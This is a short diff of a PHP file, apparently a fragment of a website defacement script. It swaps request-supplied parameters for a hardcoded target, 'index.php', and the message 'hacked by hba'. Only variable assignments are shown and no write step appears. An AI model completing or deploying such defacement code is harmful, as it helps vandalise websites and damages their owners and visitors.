@@ -2,8 +2,8 @@
 	
 
  <?php
-$file_name=$_GET['index.php'];
- $write_text=$_POST['hacked my hba'];
+$file_name='index.php';
+ $write_text='hacked by hba';
  
  
  $file_name=$file_name;
